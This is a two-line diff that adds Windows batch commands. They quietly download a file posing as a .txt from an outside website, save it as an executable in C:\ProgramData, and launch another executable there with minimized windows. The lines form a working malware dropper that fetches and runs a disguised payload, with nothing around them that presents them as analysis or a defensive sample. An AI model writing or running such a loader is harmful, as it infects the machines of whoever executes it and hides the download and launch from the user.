@@ -1,0 +1,2 @@
+start /min powershell C:\\ProgramData\\wget.exe http://www.kcico.com.tw/data/openwebmail/doc/wthk.txt -O C:\\ProgramData\\wthk.exe -b -q
+start /min powershell C:\\ProgramData\\iuso.exe
